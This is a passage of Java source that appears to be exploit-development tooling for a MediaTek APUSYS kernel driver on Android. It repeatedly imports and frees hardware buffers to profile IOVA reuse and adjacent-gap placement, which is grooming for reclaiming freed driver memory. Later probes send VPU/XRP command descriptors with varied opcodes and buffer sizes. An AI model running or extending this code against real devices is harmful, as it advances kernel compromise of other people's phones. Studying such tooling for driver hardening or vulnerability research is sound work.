        runApusysIovaGapControlProfilerCase(
            "gap_free_64k_p16_r8_i80_target_unrelated_lower",
            0x10000, 16, 8, 80, "first", "precreated",
            "target_unrelated_lower");
        runApusysIovaGapControlProfilerCase(
            "gap_free_64k_p16_r8_i80_target_lower_guard",
            0x10000, 16, 8, 80, "first", "guard",
            "target_lower");
    }

    private static void runApusysIovaGapLower2FocusProfiler()
            throws Exception {
        System.out.println("\n[*] === APUSYS IOVA gap lower-2 focus"
            + " profiler ===");
        System.out.println("[*] Mode: allocator-only focused next-round case."
            + " Fixed constraints: 64K p16/r8, first adjacent target,"
            + " pre-created replacements, free target then lower then lower-2.");
        loadRuntimeLibraries();

        runApusysIovaGapControlProfilerCase(
            "gap_focus_64k_p16_r8_until100_target_lower_lower2",
            0x10000, 16, 8, 5000, "first", "precreated",
            "target_lower_lower2", 100);
    }

    private static void runApusysIovaGapControlProfilerCase(
            String label,
            int importSize,
            int poolCount,
            int replacementCount,
            int iterations,
            String targetMode)
            throws Exception {
        runApusysIovaGapControlProfilerCase(label, importSize, poolCount,
            replacementCount, iterations, targetMode, "precreated");
    }

    private static void runApusysIovaGapControlProfilerCase(
            String label,
            int importSize,
            int poolCount,
            int replacementCount,
            int iterations,
            String targetMode,
            String replacementSource)
            throws Exception {
        runApusysIovaGapControlProfilerCase(label, importSize, poolCount,
            replacementCount, iterations, targetMode, replacementSource,
            "target_lower", 0);
    }

    private static void runApusysIovaGapControlProfilerCase(
            String label,
            int importSize,
            int poolCount,
            int replacementCount,
            int iterations,
            String targetMode,
            String replacementSource,
            String freeShape)
            throws Exception {
        runApusysIovaGapControlProfilerCase(label, importSize, poolCount,
            replacementCount, iterations, targetMode, replacementSource,
            freeShape, 0);
    }

    private static void runApusysIovaGapControlProfilerCase(
            String label,
            int importSize,
            int poolCount,
            int replacementCount,
            int iterations,
            String targetMode,
            String replacementSource,
            String freeShape,
            int targetAdjacentFound)
            throws Exception {
        if (poolCount < 2 || replacementCount < 1 || iterations < 1) {
            return;
        }
        boolean guardSource = "guard".equals(replacementSource);
        int descriptorSlotsNeeded = poolCount + replacementCount
            + (guardSource ? 1 : 0);
        if (descriptorSlotsNeeded > MAX_REUSE_PROFILE_IMPORTS) {
            replacementCount = MAX_REUSE_PROFILE_IMPORTS - poolCount
                - (guardSource ? 1 : 0);
        }
        if (replacementCount < 1) {
            return;
        }

        System.out.println("\n[*] === iova-gap-control case " + label
            + " size=0x" + Integer.toHexString(importSize)
            + " pool=" + poolCount
            + " replacements=" + replacementCount
            + " iterations=" + iterations
            + " free_order=target_then_lower"
            + " target_mode=" + targetMode
            + " replacement_source=" + replacementSource
            + " free_shape=" + freeShape
            + " target_adjacent_found=" + targetAdjacentFound
            + " ===");

        int apusysFd = -1;
        int iterationsRun = 0;
        int adjacentFound = 0;
        int noAdjacent = 0;
        int noTargetLower = 0;
        int freeShapeUnavailable = 0;
        int exactTargetTotal = 0;
        int exactTargetIterations = 0;
        int lowerHitTotal = 0;
        int importFailTotal = 0;
        int poolImportFailTotal = 0;
        int[] exactIndexHistogram = new int[replacementCount];
        int[] firstExactIndexHistogram = new int[replacementCount];
        int[] lowerIndexHistogram = new int[replacementCount];
        long closestAbsDelta = Long.MAX_VALUE;
        long closestSignedDelta = 0;
        int closestIteration = -1;
        int closestIndex = -1;
        try {
            apusysFd = DrmTrigger.openDev(APUSYS_DEV);
            for (int iter = 0; iter < iterations; iter++) {
                if (targetAdjacentFound > 0
                        && adjacentFound >= targetAdjacentFound) {
                    break;
                }
                iterationsRun = iter + 1;
                ReplacementImport[] pool = null;
                ReplacementImport[] replacements = null;
                ReplacementImport guard = null;
                boolean guardImported = false;
                boolean[] poolImported = new boolean[poolCount];
                try {
                    pool = createProfilerHardwareBufferPool(poolCount,
                        importSize, label + "_pool_" + iter);
                    if (!"fresh".equals(replacementSource)) {
                        replacements = createProfilerHardwareBufferPool(
                            replacementCount, importSize,
                            label + "_repl_" + iter);
                    }

                    int poolFailures = 0;
                    for (int pi = 0; pi < poolCount; pi++) {
                        long memDesc = DrmTrigger.sScratchBuf
                            + OFF_MEM_REUSE_BASE
                            + (pi * OFF_MEM_REUSE_STRIDE);
                        long ret = importProfilerMem(apusysFd, pool[pi],
                            memDesc, importSize, "gap_ctl_pool_" + label
                            + "_" + pi, false);
                        if (ret >= 0) {
                            poolImported[pi] = true;
                        } else {
                            poolFailures++;
                        }
                    }
                    poolImportFailTotal += poolFailures;

                    int targetIndex = findGapProfilerTarget(pool, importSize,
                        targetMode);
                    int lowerIndex = targetIndex >= 0
                        ? findExactLowerNeighbor(pool, targetIndex, importSize)
                        : -1;
                    if (targetIndex < 0 || lowerIndex < 0) {
                        noAdjacent++;
                        noTargetLower++;
                        System.out.println("[*] iova_gap_control_iter "
                            + label
                            + " iter=" + iter
                            + " adjacent_pair=none"
                            + " pool_import_fail=" + poolFailures
                            + " pool_iovas=" + profilerIovaList(pool));
                        continue;
                    }

                    int extraIndex = -1;
                    String extraRole = "-";
                    if ("target_lower_lower2".equals(freeShape)) {
                        extraIndex = findExactLowerNeighbor(pool, lowerIndex,
                            importSize);
                        extraRole = "lower2";
                    } else if ("upper_target_lower".equals(freeShape)) {
                        extraIndex = findExactUpperNeighbor(pool, targetIndex,
                            importSize);
                        extraRole = "upper";
                    } else if ("target_unrelated_lower".equals(freeShape)) {
                        extraIndex = findUnrelatedImportedNeighbor(pool,
                            targetIndex, lowerIndex, importSize);
                        extraRole = "unrelated";
                    }
                    if (!"target_lower".equals(freeShape)
                            && extraIndex < 0) {
                        noAdjacent++;
                        freeShapeUnavailable++;
                        System.out.println("[*] iova_gap_control_iter "
                            + label
                            + " iter=" + iter
                            + " free_shape_unavailable=" + freeShape
                            + " target_idx=" + targetIndex
                            + " lower_idx=" + lowerIndex
                            + " pool_import_fail=" + poolFailures
                            + " pool_iovas=" + profilerIovaList(pool));
                        continue;
                    }

                    adjacentFound++;
                    int targetIova = pool[targetIndex].iovaLow;
                    int lowerIova = pool[lowerIndex].iovaLow;
                    int extraIova = extraIndex >= 0
                        ? pool[extraIndex].iovaLow : 0;
                    long targetMemDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE
                        + (targetIndex * OFF_MEM_REUSE_STRIDE);
                    long lowerMemDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE
                        + (lowerIndex * OFF_MEM_REUSE_STRIDE);
                    long extraMemDesc = extraIndex >= 0
                        ? DrmTrigger.sScratchBuf + OFF_MEM_REUSE_BASE
                        + (extraIndex * OFF_MEM_REUSE_STRIDE) : 0;
                    long targetFreeRet = 0;
                    long lowerFreeRet = 0;
                    long extraFreeRet = 0;
                    if ("upper_target_lower".equals(freeShape)) {
                        extraFreeRet = freeProfilerMem(apusysFd,
                            pool[extraIndex], extraMemDesc,
                            "gap_ctl_" + extraRole + "_" + label, false);
                        if (extraFreeRet >= 0) {
                            poolImported[extraIndex] = false;
                        }
                    }
                    targetFreeRet = freeProfilerMem(apusysFd,
                        pool[targetIndex], targetMemDesc,
                        "gap_ctl_target_" + label, false);
                    if (targetFreeRet >= 0) {
                        poolImported[targetIndex] = false;
                    }
                    if ("target_unrelated_lower".equals(freeShape)) {
                        extraFreeRet = freeProfilerMem(apusysFd,
                            pool[extraIndex], extraMemDesc,
                            "gap_ctl_" + extraRole + "_" + label, false);
                        if (extraFreeRet >= 0) {
                            poolImported[extraIndex] = false;
                        }
                    }
                    lowerFreeRet = freeProfilerMem(apusysFd,
                        pool[lowerIndex], lowerMemDesc,
                        "gap_ctl_lower_" + label, false);
                    if (lowerFreeRet >= 0) {
                        poolImported[lowerIndex] = false;
                    }
                    if ("target_lower_lower2".equals(freeShape)) {
                        extraFreeRet = freeProfilerMem(apusysFd,
                            pool[extraIndex], extraMemDesc,
                            "gap_ctl_" + extraRole + "_" + label, false);
                        if (extraFreeRet >= 0) {
                            poolImported[extraIndex] = false;
                        }
                    }

                    if ("fresh".equals(replacementSource)) {
                        replacements = createProfilerHardwareBufferPool(
                            replacementCount, importSize,
                            label + "_fresh_repl_" + iter);
                    }
                    int guardIova = 0;
                    long guardRet = 0;
                    if (guardSource) {
                        guard = createProfilerHardwareBuffer(-1, importSize,
                            REUSE_MARKER_BASE + 0x100,
                            label + "_guard_" + iter);
                        long guardMemDesc = DrmTrigger.sScratchBuf
                            + OFF_MEM_REUSE_BASE
                            + ((poolCount + replacementCount)
                            * OFF_MEM_REUSE_STRIDE);
                        guardRet = importProfilerMem(apusysFd, guard,
                            guardMemDesc, importSize,
                            "gap_ctl_guard_" + label, false);
                        if (guardRet >= 0) {
                            guardImported = true;
                            guardIova = guard.iovaLow;
                        }
                    }

                    int exactTargetThis = 0;
                    int lowerHitThis = 0;
                    int failThis = 0;
                    int firstExactIndex = -1;
                    long closestThisAbs = Long.MAX_VALUE;
                    long closestThisSigned = 0;
                    int closestThisIndex = -1;
                    int firstReplacementIova = 0;
                    StringBuilder exactIndices = new StringBuilder();
                    StringBuilder lowerIndices = new StringBuilder();
                    for (int ri = 0; ri < replacementCount; ri++) {
                        long memDesc = DrmTrigger.sScratchBuf
                            + OFF_MEM_REUSE_BASE
                            + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
                        long ret = importProfilerMem(apusysFd,
                            replacements[ri], memDesc, importSize,
                            "gap_ctl_repl_" + label + "_" + ri, false);
                        if (ret < 0) {
                            failThis++;
                            continue;
                        }
                        if (ri == 0) {
                            firstReplacementIova = replacements[ri].iovaLow;
                        }
                        if (replacements[ri].iovaLow == targetIova) {
                            exactTargetThis++;
                            exactIndexHistogram[ri]++;
                            if (firstExactIndex < 0) {
                                firstExactIndex = ri;
                                firstExactIndexHistogram[ri]++;
                            }
                            appendIndex(exactIndices, ri);
                        }
                        if (replacements[ri].iovaLow == lowerIova) {
                            lowerHitThis++;
                            lowerIndexHistogram[ri]++;
                            appendIndex(lowerIndices, ri);
                        }
                        long delta = unsignedDelta(replacements[ri].iovaLow,
                            targetIova);
                        long absDelta = absLong(delta);
                        if (absDelta < closestThisAbs) {
                            closestThisAbs = absDelta;
                            closestThisSigned = delta;
                            closestThisIndex = ri;
                        }
                    }

                    exactTargetTotal += exactTargetThis;
                    lowerHitTotal += lowerHitThis;
                    importFailTotal += failThis;
                    if (exactTargetThis > 0) {
                        exactTargetIterations++;
                    }
                    if (closestThisAbs < closestAbsDelta) {
                        closestAbsDelta = closestThisAbs;
                        closestSignedDelta = closestThisSigned;
                        closestIteration = iter;
                        closestIndex = closestThisIndex;
                    }

                    System.out.println("[*] iova_gap_control_iter " + label
                        + " iter=" + iter
                        + " target_idx=" + targetIndex
                        + " target=0x" + Integer.toHexString(targetIova)
                        + " lower_idx=" + lowerIndex
                        + " lower=0x" + Integer.toHexString(lowerIova)
                        + " extra_role=" + extraRole
                        + " extra_idx=" + extraIndex
                        + " extra_iova=0x" + Integer.toHexString(extraIova)
                        + " target_free=" + retText(targetFreeRet)
                        + " lower_free=" + retText(lowerFreeRet)
                        + " extra_free=" + retText(extraFreeRet)
                        + " first_repl=0x"
                        + Integer.toHexString(firstReplacementIova)
                        + " guard_ret=" + retText(guardRet)
                        + " guard_iova=0x" + Integer.toHexString(guardIova)
                        + " exact_target=" + exactTargetThis + "/"
                        + replacementCount
                        + " exact_indices="
                        + indexListText(exactIndices)
                        + " first_exact_idx=" + firstExactIndex
                        + " lower_hit=" + lowerHitThis + "/"
                        + replacementCount
                        + " lower_indices="
                        + indexListText(lowerIndices)
                        + " closest_idx=" + closestThisIndex
                        + " closest_delta_to_target="
                        + signedHexDelta(closestThisSigned)
                        + " import_fail=" + failThis);
                } finally {
                    if (replacements != null) {
                        for (int ri = 0; ri < replacementCount; ri++) {
                            long memDesc = DrmTrigger.sScratchBuf
                                + OFF_MEM_REUSE_BASE
                                + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
                            freeProfilerMem(apusysFd, replacements[ri],
                                memDesc, "gap_ctl_repl_" + label + "_" + ri,
                                false);
                        }
                        closeProfilerBufferPool(replacements);
                    }
                    if (guard != null) {
                        if (guardImported) {
                            long guardMemDesc = DrmTrigger.sScratchBuf
                                + OFF_MEM_REUSE_BASE
                                + ((poolCount + replacementCount)
                                * OFF_MEM_REUSE_STRIDE);
                            freeProfilerMem(apusysFd, guard, guardMemDesc,
                                "gap_ctl_guard_" + label, false);
                        }
                        guard.closeQuietly();
                    }
                    if (pool != null) {
                        for (int pi = 0; pi < poolCount; pi++) {
                            if (poolImported[pi]) {
                                long memDesc = DrmTrigger.sScratchBuf
                                    + OFF_MEM_REUSE_BASE
                                    + (pi * OFF_MEM_REUSE_STRIDE);
                                freeProfilerMem(apusysFd, pool[pi], memDesc,
                                    "gap_ctl_pool_" + label + "_" + pi,
                                    false);
                            }
                        }
                        closeProfilerBufferPool(pool);
                    }
                }
            }

            int totalReplacementImports = adjacentFound * replacementCount;
            System.out.println("[+] iova_gap_control_summary " + label
                + " size=0x" + Integer.toHexString(importSize)
                + " pool=" + poolCount
                + " replacements=" + replacementCount
                + " iterations=" + iterationsRun
                + " max_iterations=" + iterations
                + " target_adjacent_found=" + targetAdjacentFound
                + " target_mode=" + targetMode
                + " replacement_source=" + replacementSource
                + " adjacent_found=" + adjacentFound + "/" + iterationsRun
                + " no_adjacent=" + noAdjacent
                + " no_target_lower=" + noTargetLower
                + " free_shape_unavailable=" + freeShapeUnavailable
                + " exact_target_total=" + exactTargetTotal + "/"
                + totalReplacementImports
                + " exact_target_iterations=" + exactTargetIterations
                + "/" + adjacentFound
                + " lower_hit_total=" + lowerHitTotal + "/"
                + totalReplacementImports
                + " import_fail_total=" + importFailTotal
                + " pool_import_fail_total=" + poolImportFailTotal
                + " first_exact_hist="
                + nonZeroHistogram(firstExactIndexHistogram)
                + " exact_hist=" + nonZeroHistogram(exactIndexHistogram)
                + " lower_hist=" + nonZeroHistogram(lowerIndexHistogram)
                + " closest_iter=" + closestIteration
                + " closest_idx=" + closestIndex
                + " closest_delta_to_target="
                + signedHexDelta(closestSignedDelta));
        } finally {
            if (apusysFd >= 0) {
                DrmTrigger.closeFd(apusysFd);
            }
        }
    }

    private static void runApusysIovaGapProfilerCase(String label,
                                                     int importSize,
                                                     int poolCount,
                                                     int replacementCount,
                                                     int iterations,
                                                     boolean freeLowerFirst)
            throws Exception {
        if (poolCount < 2 || replacementCount < 1 || iterations < 1) {
            return;
        }
        if (poolCount + replacementCount > MAX_REUSE_PROFILE_IMPORTS) {
            replacementCount = MAX_REUSE_PROFILE_IMPORTS - poolCount;
        }
        if (replacementCount < 1) {
            return;
        }

        System.out.println("\n[*] === iova-gap-profiler case " + label
            + " size=0x" + Integer.toHexString(importSize)
            + " pool=" + poolCount
            + " replacements=" + replacementCount
            + " iterations=" + iterations
            + " free_order="
            + (freeLowerFirst ? "lower_then_target" : "target_then_lower")
            + " ===");

        int apusysFd = -1;
        int adjacentFound = 0;
        int noAdjacent = 0;
        int exactTargetTotal = 0;
        int exactTargetIterations = 0;
        int lowerHitTotal = 0;
        int importFailTotal = 0;
        int poolImportFailTotal = 0;
        long closestAbsDelta = Long.MAX_VALUE;
        long closestSignedDelta = 0;
        int closestIteration = -1;
        int closestIndex = -1;
        try {
            apusysFd = DrmTrigger.openDev(APUSYS_DEV);
            for (int iter = 0; iter < iterations; iter++) {
                ReplacementImport[] pool = null;
                ReplacementImport[] replacements = null;
                boolean[] poolImported = new boolean[poolCount];
                try {
                    pool = createProfilerHardwareBufferPool(poolCount,
                        importSize, label + "_pool_" + iter);
                    replacements = createProfilerHardwareBufferPool(
                        replacementCount, importSize,
                        label + "_repl_" + iter);

                    int poolFailures = 0;
                    for (int pi = 0; pi < poolCount; pi++) {
                        long memDesc = DrmTrigger.sScratchBuf
                            + OFF_MEM_REUSE_BASE
                            + (pi * OFF_MEM_REUSE_STRIDE);
                        long ret = importProfilerMem(apusysFd, pool[pi],
                            memDesc, importSize, "gap_pool_" + label + "_"
                            + pi, false);
                        if (ret >= 0) {
                            poolImported[pi] = true;
                        } else {
                            poolFailures++;
                        }
                    }
                    poolImportFailTotal += poolFailures;

                    int targetIndex = findGapProfilerTarget(pool, importSize);
                    int lowerIndex = targetIndex >= 0
                        ? findExactLowerNeighbor(pool, targetIndex, importSize)
                        : -1;
                    if (targetIndex < 0 || lowerIndex < 0) {
                        noAdjacent++;
                        System.out.println("[*] iova_gap_iter " + label
                            + " iter=" + iter
                            + " adjacent_pair=none"
                            + " pool_import_fail=" + poolFailures
                            + " pool_iovas=" + profilerIovaList(pool));
                        continue;
                    }

                    adjacentFound++;
                    int targetIova = pool[targetIndex].iovaLow;
                    int lowerIova = pool[lowerIndex].iovaLow;
                    long targetMemDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE
                        + (targetIndex * OFF_MEM_REUSE_STRIDE);
                    long lowerMemDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE
                        + (lowerIndex * OFF_MEM_REUSE_STRIDE);
                    long firstFreeRet;
                    long secondFreeRet;
                    if (freeLowerFirst) {
                        firstFreeRet = freeProfilerMem(apusysFd,
                            pool[lowerIndex], lowerMemDesc,
                            "gap_lower_" + label, false);
                        if (firstFreeRet >= 0) {
                            poolImported[lowerIndex] = false;
                        }
                        secondFreeRet = freeProfilerMem(apusysFd,
                            pool[targetIndex], targetMemDesc,
                            "gap_target_" + label, false);
                        if (secondFreeRet >= 0) {
                            poolImported[targetIndex] = false;
                        }
                    } else {
                        firstFreeRet = freeProfilerMem(apusysFd,
                            pool[targetIndex], targetMemDesc,
                            "gap_target_" + label, false);
                        if (firstFreeRet >= 0) {
                            poolImported[targetIndex] = false;
                        }
                        secondFreeRet = freeProfilerMem(apusysFd,
                            pool[lowerIndex], lowerMemDesc,
                            "gap_lower_" + label, false);
                        if (secondFreeRet >= 0) {
                            poolImported[lowerIndex] = false;
                        }
                    }

                    int exactTargetThis = 0;
                    int lowerHitThis = 0;
                    int failThis = 0;
                    long closestThisAbs = Long.MAX_VALUE;
                    long closestThisSigned = 0;
                    int closestThisIndex = -1;
                    int firstReplacementIova = 0;
                    for (int ri = 0; ri < replacementCount; ri++) {
                        long memDesc = DrmTrigger.sScratchBuf
                            + OFF_MEM_REUSE_BASE
                            + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
                        long ret = importProfilerMem(apusysFd,
                            replacements[ri], memDesc, importSize,
                            "gap_repl_" + label + "_" + ri, false);
                        if (ret < 0) {
                            failThis++;
                            continue;
                        }
                        if (ri == 0) {
                            firstReplacementIova = replacements[ri].iovaLow;
                        }
                        if (replacements[ri].iovaLow == targetIova) {
                            exactTargetThis++;
                        }
                        if (replacements[ri].iovaLow == lowerIova) {
                            lowerHitThis++;
                        }
                        long delta = unsignedDelta(replacements[ri].iovaLow,
                            targetIova);
                        long absDelta = absLong(delta);
                        if (absDelta < closestThisAbs) {
                            closestThisAbs = absDelta;
                            closestThisSigned = delta;
                            closestThisIndex = ri;
                        }
                    }

                    exactTargetTotal += exactTargetThis;
                    lowerHitTotal += lowerHitThis;
                    importFailTotal += failThis;
                    if (exactTargetThis > 0) {
                        exactTargetIterations++;
                    }
                    if (closestThisAbs < closestAbsDelta) {
                        closestAbsDelta = closestThisAbs;
                        closestSignedDelta = closestThisSigned;
                        closestIteration = iter;
                        closestIndex = closestThisIndex;
                    }

                    System.out.println("[*] iova_gap_iter " + label
                        + " iter=" + iter
                        + " target_idx=" + targetIndex
                        + " target=0x" + Integer.toHexString(targetIova)
                        + " lower_idx=" + lowerIndex
                        + " lower=0x" + Integer.toHexString(lowerIova)
                        + " first_free=" + retText(firstFreeRet)
                        + " second_free=" + retText(secondFreeRet)
                        + " first_repl=0x"
                        + Integer.toHexString(firstReplacementIova)
                        + " exact_target=" + exactTargetThis + "/"
                        + replacementCount
                        + " lower_hit=" + lowerHitThis + "/"
                        + replacementCount
                        + " closest_idx=" + closestThisIndex
                        + " closest_delta_to_target="
                        + signedHexDelta(closestThisSigned)
                        + " import_fail=" + failThis);
                } finally {
                    if (replacements != null) {
                        for (int ri = 0; ri < replacementCount; ri++) {
                            long memDesc = DrmTrigger.sScratchBuf
                                + OFF_MEM_REUSE_BASE
                                + ((poolCount + ri) * OFF_MEM_REUSE_STRIDE);
                            freeProfilerMem(apusysFd, replacements[ri],
                                memDesc, "gap_repl_" + label + "_" + ri,
                                false);
                        }
                        closeProfilerBufferPool(replacements);
                    }
                    if (pool != null) {
                        for (int pi = 0; pi < poolCount; pi++) {
                            if (poolImported[pi]) {
                                long memDesc = DrmTrigger.sScratchBuf
                                    + OFF_MEM_REUSE_BASE
                                    + (pi * OFF_MEM_REUSE_STRIDE);
                                freeProfilerMem(apusysFd, pool[pi], memDesc,
                                    "gap_pool_" + label + "_" + pi, false);
                            }
                        }
                        closeProfilerBufferPool(pool);
                    }
                }
            }

            int totalReplacementImports = adjacentFound * replacementCount;
            System.out.println("[+] iova_gap_summary " + label
                + " size=0x" + Integer.toHexString(importSize)
                + " pool=" + poolCount
                + " replacements=" + replacementCount
                + " iterations=" + iterations
                + " adjacent_found=" + adjacentFound + "/" + iterations
                + " no_adjacent=" + noAdjacent
                + " exact_target_total=" + exactTargetTotal + "/"
                + totalReplacementImports
                + " exact_target_iterations=" + exactTargetIterations
                + "/" + adjacentFound
                + " lower_hit_total=" + lowerHitTotal + "/"
                + totalReplacementImports
                + " import_fail_total=" + importFailTotal
                + " pool_import_fail_total=" + poolImportFailTotal
                + " closest_iter=" + closestIteration
                + " closest_idx=" + closestIndex
                + " closest_delta_to_target="
                + signedHexDelta(closestSignedDelta));
        } finally {
            if (apusysFd >= 0) {
                DrmTrigger.closeFd(apusysFd);
            }
        }
    }

    private static void runApusysIovaReuseProfilerCase(String label,
                                                       int importSize,
                                                       int replacementCount,
                                                       int iterations,
                                                       boolean precreate,
                                                       int delayMs)
            throws Exception {
        if (replacementCount > MAX_REUSE_PROFILE_IMPORTS) {
            replacementCount = MAX_REUSE_PROFILE_IMPORTS;
        }
        if (replacementCount < 1 || iterations < 1) {
            return;
        }

        System.out.println("\n[*] === iova-reuse-profiler case " + label
            + " size=0x" + Integer.toHexString(importSize)
            + " replacements=" + replacementCount
            + " iterations=" + iterations
            + " precreate=" + (precreate ? "1" : "0")
            + " delay_ms=" + delayMs + " ===");

        int apusysFd = -1;
        ReplacementImport original = null;
        ReplacementImport[] replacements = null;
        int exactTotal = 0;
        int nearbyTotal = 0;
        int importFailTotal = 0;
        int originalImportFailTotal = 0;
        int exactIterations = 0;
        long closestAbsDelta = Long.MAX_VALUE;
        long closestSignedDelta = 0;
        int closestIteration = -1;
        int closestIndex = -1;
        long nearbyWindow = (long) importSize * (long) replacementCount;
        try {
            apusysFd = DrmTrigger.openDev(APUSYS_DEV);
            if (precreate) {
                original = createProfilerHardwareBuffer(-1, importSize,
                    REUSE_MARKER_BASE ^ 0x11111111, label + "_orig");
                replacements = createProfilerHardwareBufferPool(
                    replacementCount, importSize, label + "_repl");
            }

            for (int iter = 0; iter < iterations; iter++) {
                if (!precreate) {
                    original = createProfilerHardwareBuffer(-1, importSize,
                        REUSE_MARKER_BASE ^ 0x22222222,
                        label + "_orig_" + iter);
                    replacements = createProfilerHardwareBufferPool(
                        replacementCount, importSize,
                        label + "_repl_" + iter);
                }

                long originalMemDesc = DrmTrigger.sScratchBuf
                    + OFF_MEM_DMABUF;
                long originalRet = importProfilerMem(apusysFd, original,
                    originalMemDesc, importSize, "orig_" + label, false);
                if (originalRet < 0) {
                    originalImportFailTotal++;
                    System.out.println("[*] iova_reuse_iter " + label
                        + " iter=" + iter
                        + " original_import=fail");
                    closeProfilerBuffersIfFresh(precreate, original,
                        replacements);
                    if (!precreate) {
                        original = null;
                        replacements = null;
                    }
                    continue;
                }

                int originalIova = original.iovaLow;
                long freeRet = freeProfilerMem(apusysFd, original,
                    originalMemDesc, "orig_" + label, false);
                if (delayMs > 0) {
                    Thread.sleep(delayMs);
                }

                int exactThis = 0;
                int nearbyThis = 0;
                int failThis = 0;
                long closestThisAbs = Long.MAX_VALUE;
                long closestThisSigned = 0;
                int closestThisIndex = -1;
                int firstReplacementIova = 0;
                for (int ri = 0; ri < replacementCount; ri++) {
                    ReplacementImport replacement = replacements[ri];
                    long memDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE + (ri * OFF_MEM_REUSE_STRIDE);
                    long ret = importProfilerMem(apusysFd, replacement,
                        memDesc, importSize, "repl_" + label + "_" + ri,
                        false);
                    if (ret < 0) {
                        failThis++;
                        continue;
                    }
                    if (ri == 0) {
                        firstReplacementIova = replacement.iovaLow;
                    }
                    long delta = unsignedDelta(replacement.iovaLow,
                        originalIova);
                    long absDelta = absLong(delta);
                    if (replacement.iovaLow == originalIova) {
                        exactThis++;
                    }
                    if (absDelta <= nearbyWindow) {
                        nearbyThis++;
                    }
                    if (absDelta < closestThisAbs) {
                        closestThisAbs = absDelta;
                        closestThisSigned = delta;
                        closestThisIndex = ri;
                    }
                }

                exactTotal += exactThis;
                nearbyTotal += nearbyThis;
                importFailTotal += failThis;
                if (exactThis > 0) {
                    exactIterations++;
                }
                if (closestThisAbs < closestAbsDelta) {
                    closestAbsDelta = closestThisAbs;
                    closestSignedDelta = closestThisSigned;
                    closestIteration = iter;
                    closestIndex = closestThisIndex;
                }

                System.out.println("[*] iova_reuse_iter " + label
                    + " iter=" + iter
                    + " original=0x" + Integer.toHexString(originalIova)
                    + " original_free=" + retText(freeRet)
                    + " first_repl=0x"
                    + Integer.toHexString(firstReplacementIova)
                    + " exact=" + exactThis + "/" + replacementCount
                    + " nearby=" + nearbyThis + "/" + replacementCount
                    + " closest_idx=" + closestThisIndex
                    + " closest_delta=" + signedHexDelta(closestThisSigned)
                    + " import_fail=" + failThis);

                for (int ri = 0; ri < replacementCount; ri++) {
                    long memDesc = DrmTrigger.sScratchBuf
                        + OFF_MEM_REUSE_BASE + (ri * OFF_MEM_REUSE_STRIDE);
                    freeProfilerMem(apusysFd, replacements[ri], memDesc,
                        "repl_" + label + "_" + ri, false);
                }

                closeProfilerBuffersIfFresh(precreate, original,
                    replacements);
                if (!precreate) {
                    original = null;
                    replacements = null;
                }
            }

            int totalReplacementImports = iterations * replacementCount;
            System.out.println("[+] iova_reuse_summary " + label
                + " size=0x" + Integer.toHexString(importSize)
                + " replacements=" + replacementCount
                + " iterations=" + iterations
                + " precreate=" + (precreate ? "1" : "0")
                + " exact_total=" + exactTotal + "/"
                + totalReplacementImports
                + " exact_iterations=" + exactIterations + "/"
                + iterations
                + " nearby_total=" + nearbyTotal + "/"
                + totalReplacementImports
                + " import_fail_total=" + importFailTotal
                + " original_import_fail_total="
                + originalImportFailTotal
                + " closest_iter=" + closestIteration
                + " closest_idx=" + closestIndex
                + " closest_delta=" + signedHexDelta(closestSignedDelta));
        } finally {
            if (original != null) {
                original.closeQuietly();
            }
            if (replacements != null) {
                closeProfilerBufferPool(replacements);
            }
            if (apusysFd >= 0) {
                DrmTrigger.closeFd(apusysFd);
            }
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsDescriptorLayoutMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] descriptorModes = {
            VPU_DESC_LIBVPU_CODE5,
            VPU_DESC_LIBVPU_MIXED5,
            VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST,
        };
        for (int descriptorMode : descriptorModes) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " descriptor-layout case "
                + vpuDescriptorModeName(descriptorMode) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, descriptorMode,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, XRP_OPCODE_XTENSA_ANN_VERSION,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsOutputFirstOpcodeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        XrpOpSpec[] specs = targetCode5NoSettingsOpcodeMatrixSpecs();
        for (XrpOpSpec op : specs) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " output-first opcode case " + op.label + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                op, 1000, true, VPU_DESC_LIBVPU_MIXED5_OUTPUT_FIRST,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
                XRP_SETTINGS_LEN_WRAPPER, XRP_OUTPUT_HEADER_FLAG_DEFAULT,
                XrpSettingsShape.WRAPPER_ONE_DATA, dispatch,
                VPU_REQUEST_FLAGS_DEFAULT, false, op.opcode,
                null, null, null, null, null, null, null);
        }
    }

    private static void runRunCmdVpuXrpTargetCode5NoSettingsCodebufSizeMatrixProbe(
            int apusysFd, boolean dispatch) throws Exception {
        int[] sizes = { 0x20, 0x90, 0x1c8, 0xb6c, 0xb70, 0xb80 };
        for (int size : sizes) {
            System.out.println("\n[*] === target-code5/no-settings"
                + " outer codebuf-size case size=0x"
                + Integer.toHexString(size) + " dispatch="
                + (dispatch ? 1 : 0) + " ===");
            runRunCmdVpuIovaHardwareBufferProbe(apusysFd, dispatch, true, true,
                XRP_OP_ANN_VERSION, 1000, true, VPU_DESC_LIBVPU_CODE5,
                XRP_CMD_FLAGS_SEND, VPU_DESC_ORDER_CODE_OUTPUT,
